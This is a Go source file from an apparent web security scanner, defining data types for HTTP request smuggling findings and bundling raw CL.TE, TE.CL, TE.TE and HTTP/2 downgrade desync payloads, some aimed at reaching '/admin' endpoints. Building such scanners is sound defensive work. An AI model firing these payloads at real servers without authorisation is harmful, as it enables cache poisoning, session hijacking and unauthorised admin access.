package smuggling

import (
	"time"

	"github.com/CodeMonkeyCybersecurity/shells/pkg/types"
)

// SmuggleTechnique represents a request smuggling technique
type SmuggleTechnique interface {
	Name() string
	Description() string
	Test(target string) []types.Finding
	Category() string
	Severity() types.Severity
}

// SmugglingVulnerability represents a request smuggling vulnerability
type SmugglingVulnerability struct {
	ID          string            `json:"id"`
	Type        string            `json:"type"`
	Technique   string            `json:"technique"`
	Severity    types.Severity    `json:"severity"`
	Target      string            `json:"target"`
	Title       string            `json:"title"`
	Description string            `json:"description"`
	Details     string            `json:"details"`
	Impact      string            `json:"impact"`
	PoC         string            `json:"poc"`
	Evidence    []Evidence        `json:"evidence"`
	Remediation Remediation       `json:"remediation"`
	CVSS        float64           `json:"cvss"`
	CWE         string            `json:"cwe"`
	References  []string          `json:"references"`
	CreatedAt   time.Time         `json:"created_at"`
}

// Evidence represents evidence for a smuggling vulnerability
type Evidence struct {
	Type         string               `json:"type"`
	Description  string               `json:"description"`
	RequestPair  *RequestPair         `json:"request_pair,omitempty"`
	ResponsePair *ResponsePair        `json:"response_pair,omitempty"`
	Timing       *TimingEvidence      `json:"timing,omitempty"`
	Differential *DifferentialEvidence `json:"differential,omitempty"`
	Data         map[string]interface{} `json:"data,omitempty"`
}

// RequestPair represents a pair of requests used in smuggling
type RequestPair struct {
	Request1 *HTTPRequest `json:"request1"`
	Request2 *HTTPRequest `json:"request2"`
}

// ResponsePair represents a pair of responses from smuggling
type ResponsePair struct {
	Response1 *HTTPResponse `json:"response1"`
	Response2 *HTTPResponse `json:"response2"`
}

// TimingEvidence represents timing-based evidence
type TimingEvidence struct {
	Request1Time time.Duration `json:"request1_time"`
	Request2Time time.Duration `json:"request2_time"`
	Difference   time.Duration `json:"difference"`
	Description  string        `json:"description"`
}

// DifferentialEvidence represents differential response evidence
type DifferentialEvidence struct {
	ExpectedResponse *HTTPResponse `json:"expected_response"`
	ActualResponse   *HTTPResponse `json:"actual_response"`
	Differences      []string      `json:"differences"`
	Description      string        `json:"description"`
}

// HTTPRequest represents an HTTP request
type HTTPRequest struct {
	Method     string            `json:"method"`
	URL        string            `json:"url"`
	Headers    map[string]string `json:"headers"`
	Body       string            `json:"body"`
	RawRequest string            `json:"raw_request"`
}

// HTTPResponse represents an HTTP response
type HTTPResponse struct {
	StatusCode   int               `json:"status_code"`
	Headers      map[string]string `json:"headers"`
	Body         string            `json:"body"`
	RawResponse  string            `json:"raw_response"`
	Time         time.Duration     `json:"time"`
	ContentLength int64            `json:"content_length"`
}

// Remediation represents remediation steps
type Remediation struct {
	Description string   `json:"description"`
	Steps       []string `json:"steps"`
	Priority    string   `json:"priority"`
}

// SmugglingPayload represents a smuggling payload
type SmugglingPayload struct {
	Name        string            `json:"name"`
	Description string            `json:"description"`
	Technique   string            `json:"technique"`
	Request1    string            `json:"request1"`
	Request2    string            `json:"request2"`
	Headers     map[string]string `json:"headers"`
	Expected    string            `json:"expected"`
	Impact      string            `json:"impact"`
	Severity    string            `json:"severity"`
}

// SmugglingConfig represents scanner configuration
type SmugglingConfig struct {
	Timeout            time.Duration `json:"timeout"`
	MaxRetries         int           `json:"max_retries"`
	UserAgent          string        `json:"user_agent"`
	FollowRedirects    bool          `json:"follow_redirects"`
	VerifySSL          bool          `json:"verify_ssl"`
	DifferentialDelay  time.Duration `json:"differential_delay"`
	MaxPayloadSize     int           `json:"max_payload_size"`
	Techniques         []string      `json:"techniques"`
	EnableTimingAnalysis bool        `json:"enable_timing_analysis"`
	EnableDifferentialAnalysis bool  `json:"enable_differential_analysis"`
	CustomHeaders      map[string]string `json:"custom_headers"`
}

// SmugglingResult represents a smuggling test result
type SmugglingResult struct {
	Technique     string        `json:"technique"`
	Vulnerable    bool          `json:"vulnerable"`
	Confidence    float64       `json:"confidence"`
	Evidence      []Evidence    `json:"evidence"`
	Duration      time.Duration `json:"duration"`
	ErrorMessage  string        `json:"error_message,omitempty"`
}

// DetectionMethod represents a detection method
type DetectionMethod struct {
	Name        string `json:"name"`
	Description string `json:"description"`
	Enabled     bool   `json:"enabled"`
}

// Constants for smuggling vulnerability types
const (
	VulnSmugglingCLTE         = "HTTP_REQUEST_SMUGGLING_CL_TE"
	VulnSmugglingTECL         = "HTTP_REQUEST_SMUGGLING_TE_CL"
	VulnSmugglingTETE         = "HTTP_REQUEST_SMUGGLING_TE_TE"
	VulnSmugglingHTTP2        = "HTTP_REQUEST_SMUGGLING_HTTP2"
	VulnSmugglingDualChunked  = "HTTP_REQUEST_SMUGGLING_DUAL_CHUNKED"
	VulnSmugglingBoundary     = "HTTP_REQUEST_SMUGGLING_BOUNDARY"
	VulnSmugglingCachePoison  = "HTTP_REQUEST_SMUGGLING_CACHE_POISON"
	VulnSmugglingDesyncAttack = "HTTP_REQUEST_SMUGGLING_DESYNC_ATTACK"
)

// Smuggling techniques
const (
	TechniqueCLTE        = "CL.TE"
	TechniqueTECL        = "TE.CL"
	TechniqueTETE        = "TE.TE"
	TechniqueHTTP2       = "HTTP2"
	TechniqueDualChunked = "DUAL_CHUNKED"
	TechniqueBoundary    = "BOUNDARY"
	TechniqueDesync      = "DESYNC"
)

// Detection methods
const (
	DetectionTiming       = "timing"
	DetectionDifferential = "differential"
	DetectionResponse     = "response"
	DetectionError        = "error"
)

// Common payloads for testing
var CLTEPayloads = []SmugglingPayload{
	{
		Name:        "Basic CL.TE Payload",
		Description: "Basic Content-Length Transfer-Encoding desync",
		Technique:   TechniqueCLTE,
		Request1: `POST / HTTP/1.1
Host: TARGET
Content-Length: 6
Transfer-Encoding: chunked

0

G`,
		Request2: `POST / HTTP/1.1
Host: TARGET
Content-Length: 0

`,
		Expected: "Backend processes smuggled request",
		Impact:   "Request smuggling allowing cache poisoning and request hijacking",
		Severity: "HIGH",
	},
	{
		Name:        "CL.TE with Prefix",
		Description: "CL.TE with prefix to trigger desync",
		Technique:   TechniqueCLTE,
		Request1: `POST / HTTP/1.1
Host: TARGET
Content-Length: 13
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: TARGET

`,
		Expected: "Admin endpoint access via smuggled request",
		Impact:   "Unauthorized access to administrative endpoints",
		Severity: "CRITICAL",
	},
}

var TECLPayloads = []SmugglingPayload{
	{
		Name:        "Basic TE.CL Payload",
		Description: "Basic Transfer-Encoding Content-Length desync",
		Technique:   TechniqueTECL,
		Request1: `POST / HTTP/1.1
Host: TARGET
Content-Length: 4
Transfer-Encoding: chunked

12
GPOST / HTTP/1.1
Host: TARGET
0

`,
		Expected: "Frontend processes as chunked, backend as Content-Length",
		Impact:   "Request smuggling allowing session hijacking",
		Severity: "HIGH",
	},
}

var TETEPayloads = []SmugglingPayload{
	{
		Name:        "Basic TE.TE Payload",
		Description: "Transfer-Encoding Transfer-Encoding obfuscation",
		Technique:   TechniqueTETE,
		Request1: `POST / HTTP/1.1
Host: TARGET
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: x

5e
GPOST / HTTP/1.1
Host: TARGET
Content-Length: 15

x=1
0

`,
		Expected: "Different Transfer-Encoding processing",
		Impact:   "Request smuggling via header obfuscation",
		Severity: "HIGH",
	},
}

var HTTP2Payloads = []SmugglingPayload{
	{
		Name:        "HTTP/2 Downgrade Smuggling",
		Description: "HTTP/2 to HTTP/1.1 downgrade smuggling",
		Technique:   TechniqueHTTP2,
		Request1: `POST / HTTP/2
Host: TARGET
Content-Length: 0

GET /admin HTTP/1.1
Host: TARGET
Content-Length: 10

x=1`,
		Expected: "HTTP/2 frontend downgrades to HTTP/1.1 backend",
		Impact:   "Request smuggling via protocol downgrade",
		Severity: "HIGH",
	},
}

// Response patterns that indicate smuggling
var SmugglingIndicators = []string{
	"Unrecognized method",
	"Bad request",
	"Invalid request",
	"Malformed request",
	"Request timeout",
	"Connection closed",
	"Unexpected end of input",
	"Invalid chunk size",
	"Bad chunk encoding",
	"Invalid content length",
	"Conflicting headers",
}

// Timing thresholds for detection
const (
	TimingThresholdMs        = 1000 // 1 second
	DifferentialThresholdMs  = 500  // 500ms
	MaxResponseSize          = 1048576 // 1MB
	DefaultTimeout           = 30 * time.Second
	DefaultDifferentialDelay = 5 * time.Second
)

// HTTP/2 specific constants
const (
	HTTP2MethodConnect = "CONNECT"
	HTTP2PseudoHeader  = ":"
	HTTP2SettingsFrame = "SETTINGS"
	HTTP2DataFrame     = "DATA"
)

// Detection confidence levels
const (
	ConfidenceHigh   = 0.9
	ConfidenceMedium = 0.6
	ConfidenceLow    = 0.3
)